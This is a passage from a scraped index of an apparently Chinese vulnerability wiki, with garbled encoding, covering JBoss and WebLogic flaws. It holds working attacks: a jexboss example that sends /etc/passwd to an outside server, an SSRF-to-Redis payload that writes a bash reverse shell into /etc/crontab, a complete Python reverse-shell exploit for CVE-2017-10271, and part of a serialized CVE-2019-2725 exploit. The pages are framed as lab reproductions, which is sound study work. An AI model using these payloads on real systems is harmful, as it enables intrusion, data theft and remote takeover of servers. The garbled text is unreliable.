automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (Questions, problems, suggestions and etc: joaomatosf@gmail.com PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-15 12:15:04 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Jboss/JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504.html","title":"JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504","keywords":"","body":"JBoss 4.x JBossMQ JMS ååºåˆ—åŒ–æ¼æ´ CVE-2017-7504 æ¼æ´æè¿° Red Hat JBoss Application Server æ˜¯ä¸€æ¬¾åŸºäºJavaEEçš„å¼€æºåº”ç”¨æœåŠ¡å™¨ã€‚JBoss AS 4.xåŠä¹‹å‰ç‰ˆæœ¬ä¸­ï¼ŒJbossMQå®ç°è¿‡ç¨‹çš„JMS over HTTP Invocation Layerçš„HTTPServerILServlet.javaæ–‡ä»¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œè¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„åºåˆ—åŒ–æ•°æ®åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„ä»£ç ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] JBoss AS 4.xåŠä¹‹å‰ç‰ˆæœ¬ ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d æ¼æ´å¤ç° è®¿é—®æ§åˆ¶å° ä½¿ç”¨å·¥å…· Jexboss è¿›è¡Œæ¼æ´æ‰«æ python3 jexboss.py -host http://192.168.51.133:8080 æˆåŠŸåˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/","title":"Weblogic","keywords":"","body":"Weblogic Weblogic SSRFæ¼æ´ CVE-2014-4210 Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271 Weblogic ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2019-2725 Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-19 11:35:40 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· WeblogicScanner PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-15 09:00:53 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/æ‰«æå·¥å…· WeblogicScanner.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Scan/æ‰«æå·¥å…· WeblogicScanner.html","title":"æ‰«æå·¥å…· WeblogicScanner","keywords":"","body":"WeblogicScanner æ¼æ´æ‰«æ æºå·¥å…·é“¾æ¥ï¼šhttps://github.com/rabbitmask/WeblogicScan weblogicScaner ç®€ä½“ä¸­æ–‡ | English æˆªè‡³ 2020 å¹´ 11 æœˆ 27 æ—¥ï¼Œweblogic æ¼æ´æ‰«æå·¥å…·ã€‚è‹¥å­˜åœ¨æœªè®°å½•ä¸”å·²å…¬å¼€ POC çš„æ¼æ´ï¼Œæ¬¢è¿æäº¤ issueã€‚ åŸä½œè€…å·²ç»æ”¶é›†å¾—æ¯”è¾ƒå®Œæ•´äº†ï¼Œåœ¨è¿™é‡Œåšäº†éƒ¨åˆ†çš„ bug ä¿®å¤ï¼Œéƒ¨åˆ†è„šæœ¬ POC æœªç”Ÿæ•ˆï¼Œé…ç½®é”™è¯¯ç­‰é—®é¢˜ã€‚ä¹‹å‰æŸ¥äº†ä¸€ä¸‹å‘ç°éƒ¨åˆ† POC æ— æ³•ä½¿ç”¨ã€‚åœ¨è¿™ä¸ªé¡¹ç›®é‡Œé¢å¯¹è„šæœ¬åšäº†ä¸€äº›ä¿®æ”¹ï¼Œæé«˜å‡†ç¡®ç‡ã€‚ æ³¨æ„ï¼šéƒ¨åˆ†æ¼æ´ç”±äºç¨³å®šæ€§åŸå› éœ€è¦å¤šæ¬¡æµ‹è¯•æ‰å¯éªŒè¯ ç›®å‰å¯æ£€æµ‹æ¼æ´ç¼–å·æœ‰ï¼ˆéƒ¨åˆ†éåŸç†æ£€æµ‹ï¼Œéœ€æ‰‹åŠ¨éªŒè¯ï¼‰ï¼š weblogic administrator console CVE-2014-4210 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-2894 CVE-2018-3191 CVE-2018-3245 CVE-2018-3252 CVE-2019-2618 CVE-2019-2725 CVE-2019-2729 CVE-2019-2890 CVE-2020-2551 CVE-2020-14882 CVE-2020-14883 å¿«é€Ÿå¼€å§‹ ä¾èµ– python >= 3.6 è¿›å…¥é¡¹ç›®ç›®å½•ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ä¾èµ–åº“ $ pip3 install requests ä½¿ç”¨è¯´æ˜ usage: ws.py [-h] -t TARGETS [TARGETS ...] -v VULNERABILITY [VULNERABILITY ...] [-o OUTPUT] optional arguments: -h, --help å¸®åŠ©ä¿¡æ¯ -t TARGETS [TARGETS ...], --targets TARGETS [TARGETS ...] ç›´æ¥å¡«å…¥ç›®æ ‡æˆ–æ–‡ä»¶åˆ—è¡¨ï¼ˆé»˜è®¤ä½¿ç”¨ç«¯å£7001ï¼‰. ä¾‹å­ï¼š 127.0.0.1:7001 -v VULNERABILITY [VULNERABILITY ...], --vulnerability VULNERABILITY [VULNERABILITY ...] æ¼æ´åç§°æˆ–CVEç¼–å·ï¼Œä¾‹å­ï¼š\"weblogic administrator console\" -o OUTPUT, --output OUTPUT è¾“å‡º json ç»“æœçš„è·¯å¾„ã€‚é»˜è®¤ä¸è¾“å‡ºç»“æœ -s, --ssl å¼ºåˆ¶ä½¿ç”¨ https åè®®è¯·æ±‚ ç»“æœæ ·ä¾‹ (venv) ~/weblogicScanner$ python ws.py -t 192.168.124.129 [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Start... [23:03:04][INFO] [+][Weblogic Console][192.168.56.129:7001] Found module! [23:03:04][INFO] [*][Weblogic Console][192.168.56.129:7001] Please verify manually! [23:03:04][INFO] [*][CVE-2014-4210][192.168.56.129:7001] Start... [23:03:04][INFO] [-][CVE-2014-4210][192.168.56.129:7001] Not found. [23:03:04][INFO] [*][CVE-2016-0638][192.168.56.129:7001] Start... [23:03:06][INFO] [-][CVE-2016-0638][192.168.56.129:7001] Not vulnerability. [23:03:06][INFO] [*][CVE-2016-3510][192.168.56.129:7001] Start... [23:03:08][INFO] [-][CVE-2016-3510][192.168.56.129:7001] Not vulnerability. [23:03:08][INFO] [*][CVE-2017-3248][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3248][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-3506][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-3506][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2017-10271][192.168.56.129:7001] Start... [23:03:10][INFO] [-][CVE-2017-10271][192.168.56.129:7001] Not vulnerability. [23:03:10][INFO] [*][CVE-2018-2628][192.168.56.129:7001] Start... [23:03:14][INFO] [+][CVE-2018-2628][192.168.56.129:7001] Exists vulnerability! [23:03:14][INFO] [*][CVE-2018-2893][192.168.56.129:7001] Start... [23:03:18][INFO] [+][CVE-2018-2893][192.168.56.129:7001] Exists vulnerability! [23:03:18][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Start... [23:03:19][INFO] [+][CVE-2018-2894][192.168.56.129:7001] Found module! [23:03:19][INFO] [*][CVE-2018-2894][192.168.56.129:7001] Please verify manually! [23:03:19][INFO] [*][CVE-2018-3191][192.168.56.129:7001] Start... [23:03:23][INFO] [+][CVE-2018-3191][192.168.56.129:7001] Exists vulnerability! [23:03:23][INFO] [*][CVE-2018-3245][192.168.56.129:7001] Start... [23:03:29][INFO] [-][CVE-2018-3245][192.168.56.129:7001] Not vulnerability. [23:03:29][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2018-3252][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2018-3252][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Start... [23:03:36][INFO] [+][CVE-2019-2618][192.168.56.129:7001] Found module! [23:03:36][INFO] [*][CVE-2019-2618][192.168.56.129:7001] Please verify manually! [23:03:36][INFO] [*][CVE-2019-2725][192.168.56.129:7001] Start... [23:03:46][INFO] [-][CVE-2019-2725][192.168.56.129:7001] Not vulnerability. [23:03:46][INFO] [*][CVE-2019-2729][192.168.56.129:7001] Start... [23:03:54][INFO] [-][CVE-2019-2729][192.168.56.129:7001] Not vulnerability. [23:03:54][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Start... [23:03:56][INFO] [+][CVE-2019-2888][192.168.56.129:7001] Found module! [23:03:56][INFO] [*][CVE-2019-2888][192.168.56.129:7001] Please verify manually! [23:03:56][INFO] [*][CVE-2019-2890][192.168.56.129:7001] Start... [23:03:58][INFO] [-][CVE-2019-2890][192.168.56.129:7001] Not vulnerability. [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Start... [23:03:58][INFO] [+][CVE-2020-2551][192.168.56.129:7001] Found module! [23:03:58][INFO] [*][CVE-2020-2551][192.168.56.129:7001] Please verify manually! [23:03:58][INFO] [*][CVE-2020-2555][192.168.56.129:7001] Start... [23:04:02][INFO] [+][CVE-2020-2555][192.168.56.129:7001] Exists vulnerability! [23:04:02][INFO] [*][CVE-2020-2883][192.168.56.129:7001] Start... [23:04:06][INFO] [+][CVE-2020-2883][192.168.56.129:7001] Exists vulnerability! [23:04:06][INFO] [*][CVE-2020-14882][192.168.56.129:7001] Start... [23:04:23][INFO] [-][CVE-2020-14882][192.168.56.129:7001] Not vulnerability. [23:04:23][INFO] [*][CVE-2020-14883][192.168.56.129:7001] Start... [23:04:23][INFO] [+][CVE-2020-14883][192.168.56.129:7001] Exists vulnerability! PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-13 23:46:19 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic SSRFæ¼æ´ CVE-2014-4210.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic SSRFæ¼æ´ CVE-2014-4210.html","title":"Weblogic SSRFæ¼æ´ CVE-2014-4210","keywords":"","body":"Weblogic SSRFæ¼æ´ CVE-2014-4210 æ¼æ´æè¿° Weblogicä¸­å­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å‘é€ä»»æ„HTTPè¯·æ±‚ï¼Œè¿›è€Œæ”»å‡»å†…ç½‘ä¸­redisã€fastcgiç­‰è„†å¼±ç»„ä»¶ï¼Œæ­¤æ¼æ´å¯é€šè¿‡HTTPåè®®åˆ©ç”¨ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´å½±å“å—å½±å“ç»„ä»¶çš„æœºå¯†æ€§ æ¼æ´å½±å“ [!NOTE] Oracle WebLogic Server 10.0.2.0 Oracle WebLogic Server 10.3.6.0 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/ssrd docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:7001 æ­£å¸¸å³å¯ æ¼æ´å¤ç° å‡ºç°æ¼æ´çš„ URLä¸º : http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp ä½¿ç”¨ payload è¿›è¡Œæ¢æµ‹, å°†æ¢æµ‹çš„ä½ç½®å†™åœ¨ operatorå‚æ•°ä¸­ [!NOTE] æ³¨æ„éœ€è¦çŸ¥é“å†…ç½‘ IP http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://xxx.xxx.xxx.xxx:7001 é€šè¿‡æŸ¥çœ‹æŠ¥é”™å†…å®¹æ¥è¿›è¡Œåˆ¤æ–­ å­˜åœ¨çš„æŠ¥é”™å†…å®¹å¦‚å›¾ï¼Œå…³é”®å­—ä¸º 404, ä¾‹å¦‚æŠŠ operator å‚æ•°æ”¹æˆ http://xxx.xxx.xxx.xxx:7000 è¿™æ ·ä¸å­˜åœ¨çš„åˆ™æŠ¥é”™å†…å®¹å¦‚ä¸‹å›¾ é€šè¿‡è¿™æ ·çš„æ–¹æ³•å°±å¯ä»¥æ¢æµ‹å†…ç½‘çš„å¼€æ”¾ç«¯å£æƒ…å†µï¼Œä¾‹å¦‚å†…ç½‘ä¸­æœ‰ä¸€å°ä¸»æœº IPï¼š172.19.0.2 å¼€å¯äº† 6379ç«¯å£çš„redisæœåŠ¡ å¦‚æœè®¿é—®çš„éhttpåè®®ï¼Œåˆ™ä¼šè¿”å›did not have a valid SOAP content-typeï¼Œè¿™æ ·é€šè¿‡é”™è¯¯çš„ä¸åŒï¼Œå³å¯æ¢æµ‹å†…ç½‘çŠ¶æ€ã€‚ Weblogicçš„SSRFæœ‰ä¸€ä¸ªæ¯”è¾ƒå¤§çš„ç‰¹ç‚¹ï¼Œå…¶è™½ç„¶æ˜¯ä¸€ä¸ªâ€œGETâ€è¯·æ±‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥%0a%0dæ¥æ³¨å…¥æ¢è¡Œç¬¦ï¼Œè€ŒæŸäº›æœåŠ¡ï¼ˆå¦‚redisï¼‰æ˜¯é€šè¿‡æ¢è¡Œç¬¦æ¥åˆ†éš”æ¯æ¡å‘½ä»¤ï¼Œä¹Ÿå°±è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥SSRFæ”»å‡»å†…ç½‘ä¸­çš„redisæœåŠ¡å™¨ã€‚ å‘é€ä¸‰æ¡rediså‘½ä»¤ï¼Œå°†å¼¹shellè„šæœ¬å†™å…¥/etc/crontab ä¸­ï¼š set 1 \"\\n\\n\\n\\n* * * * * root bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1\\n\\n\\n\\n\" config set dir /etc/ config set dbfilename crontab save æ¥ç€å†å°†è¯·æ±‚è¿›è¡Œ urlç¼–ç , [!NOTE] æ³¨æ„ï¼Œæ¢è¡Œç¬¦æ˜¯â€œ\\r\\nâ€ï¼Œä¹Ÿå°±æ˜¯â€œ%0D%0Aâ€ test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa å‘é€payload http://xxx.xxx.xxx.xxx:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.3%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa å‘é€åç›‘å¬ 172.19.0.3 9999ç«¯å£ ç­‰å¾…åå¼¹shell [!NOTE] æœ€åè¡¥å……ä¸€ä¸‹ï¼Œå¯è¿›è¡Œåˆ©ç”¨çš„cronæœ‰å¦‚ä¸‹å‡ ä¸ªåœ°æ–¹ï¼š /etc/crontab è¿™ä¸ªæ˜¯è‚¯å®šçš„ /etc/cron.d/* å°†ä»»æ„æ–‡ä»¶å†™åˆ°è¯¥ç›®å½•ä¸‹ï¼Œæ•ˆæœå’Œcrontabç›¸åŒï¼Œæ ¼å¼ä¹Ÿè¦å’Œ/etc/crontabç›¸åŒã€‚æ¼æ´åˆ©ç”¨è¿™ä¸ªç›®å½•ï¼Œå¯ä»¥åšåˆ°ä¸è¦†ç›–ä»»ä½•å…¶ä»–æ–‡ä»¶çš„æƒ…å†µè¿›è¡Œå¼¹shellã€‚ /var/spool/cron/root centosç³»ç»Ÿä¸‹rootç”¨æˆ·çš„cronæ–‡ä»¶ /var/spool/cron/crontabs/root debianç³»ç»Ÿä¸‹rootç”¨æˆ·çš„cronæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC GitHubè„šæœ¬ CVE-2014-4210+Redisæœªæˆæƒè®¿é—® å­˜æ´»æ‰«æ: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type livedetect ç«¯å£æ‰«æ: python SSRFX.py --url http://example.com/uddiexplorer/SearchPublicRegistries.jsp --app weblogic --network 172.16.5.0/24 --type portscan Goby && POC [!NOTE] Weblogic SSRFæ¼æ´ CVE-2014-4210 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271.html","title":"Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271","keywords":"","body":"Weblogic XMLDecoder è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-10271 æ¼æ´æè¿° Weblogicçš„WLS Securityç»„ä»¶å¯¹å¤–æä¾›webserviceæœåŠ¡ï¼Œå…¶ä¸­ä½¿ç”¨äº†XMLDecoderæ¥è§£æç”¨æˆ·ä¼ å…¥çš„XMLæ•°æ®ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Weblogic 10.3.6.0.0 Weblogic 12.1.3.0.0 Weblogic 12.2.1.0.0 Weblogic 12.2.1.2.0 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:7001 æ­£å¸¸å³å¯ æ¼æ´å¤ç° å¯¹ http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType è¿›è¡Œè®¿é—®ï¼Œå­˜åœ¨è¿™ä¸ªurlåˆ™å¯èƒ½å­˜åœ¨æ¼æ´ å…¶ä»–å¯åˆ©ç”¨URL /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 ä½¿ç”¨POSTæ–¹æ³•ä¸Šä¼ ä»¥ä¸‹æ•°æ®åå¼¹ä¸€ä¸ªshell /bin/bash -c bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1 ä½¿ç”¨Curlåå¼¹shell (å°†ä¸Šé¢çš„xmlæ•°æ®ä¿å­˜ä¸ºpoc.xml) curl -v -X POST -H \"Content-Type: text/xml\" --data @poc.xml \"http://xxx.xxx.xxx.xxx:7001/wls-wsat/CoordinatorPortType\" ä¹Ÿå¯ä»¥é€šè¿‡æ¼æ´å†™å…¥webshellæ–‡ä»¶ servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp ]]> è®¿é—® http://xxx.xxx.xxx.xxx:7001/bea_wls_internal/test.jsp å³å¯å¾—åˆ°å†™å…¥çš„æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC åˆ©ç”¨ weblogic-scanå¿«é€Ÿæ£€æµ‹ [!NOTE] åå¼¹shell exp #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Weblogic 10.3.6.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.1.3.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.0.0 \\033[0m') print('+ \\033[34m Weblogic 12.2.1.2.0 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2017-10271.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:7001 \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url, IP, PORT): vuln_url = target_url + \"/wls-wsat/CoordinatorPortType\" headers = { \"Content-Type\": \"text/xml\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" /bin/bash -c bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1 \"\"\" % (IP,PORT) try: response = requests.request(\"POST\", url=vuln_url, headers=headers, data=data) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_1(target_url, IP, PORT) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2019-2725.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Weblogic/Weblogic ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2019-2725.html","title":"Weblogic ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2019-2725","keywords":"","body":"Weblogic ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2019-2725 æ¼æ´æè¿° 2019å¹´06æœˆ15æ—¥ï¼Œ360CERTç›‘æµ‹åˆ°åœ¨é‡çš„Oracle Weblogicè¿œç¨‹ååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´ç»•è¿‡äº†æœ€æ–°çš„Weblogicè¡¥ä¸ï¼ˆCVE-2019-2725ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„HTTPè¯·æ±‚ï¼Œåœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ç›®å‰å®˜æ–¹è¡¥ä¸æœªå‘å¸ƒï¼Œæ¼æ´ç»†èŠ‚æœªå…¬å¼€ã€‚360CERTç»ç ”åˆ¤ååˆ¤å®šè¯¥æ¼æ´ç»¼åˆè¯„çº§ä¸ºâ€œé«˜å±â€ï¼Œå¼ºçƒˆå»ºè®®å—å½±å“çš„ç”¨æˆ·å°½å¿«æ ¹æ®ä¸´æ—¶ä¿®è¡¥å»ºè®®è¿›è¡Œä¸´æ—¶å¤„ç½®ï¼Œé˜²æ­¢æ”¶åˆ°æ”»å‡»è€…æ”»å‡»ã€‚ æ¼æ´å½±å“ [!NOTE] Weblogic 10.3.6 Weblogic 12.1.3 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2017-10271 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:7001 æ­£å¸¸å³å¯ æ¼æ´å¤ç° æ¼æ´åˆ†ææ–‡ç«  https://xz.aliyun.com/t/5024 è¿™é‡Œä½¿ç”¨POCè¿›è¡Œå¤ç° POCåœ°å€: https://github.com/TopScrew/CVE-2019-2725 [!NOTE] POCå¯åˆ©ç”¨äºå‘½ä»¤æ‰§è¡Œå’ŒWebshellä¸Šä¼  æ¼æ´åˆ©ç”¨POC https://github.com/TopScrew/CVE-2019-2725/blob/master/weblogic-2019-2725.py # encoding=utf8 import sys import requests from logzero import logger headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", } def weblogic_10_3_6(ip,cmd): headers = { \"Accept-Language\":\"zh-CN,zh;q=0.9,en;q=0.8\", \"User-Agent\":\"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\", \"Content-Type\":\"text/xml\", \"cmd\":\"%s\"%(cmd) } body = \"\"\" oracle.toplink.internal.sessions.UnitOfWorkChangeSet -84-19051151140231069711897461171161051084676105110107101100729711510483101116-40108-4190-107-35423020012011401710697118974611711610510846729711510483101116-7068-123-107-106-72-735230012011211912000166364000002115114058991111094611511711046111114103469711297991041014612097108971104610511011610111411097108461201151081169946116114971204684101109112108971161011157310911210898779-63110-84-8551309730139510511010010111011678117109981011147301495116114971101151081011167311010010112090021951171151018310111411810599101115771019910497110105115109760259597999910111511569120116101114110971088311612110810111510410110111611601876106971189747108971101034783116114105110103597601195971171206710897115115101115116059769911110947115117110471111141034797112979910410147120971089711047105110116101114110971084712011510811699471141171101161051091014772971151041169798108101599101095981211161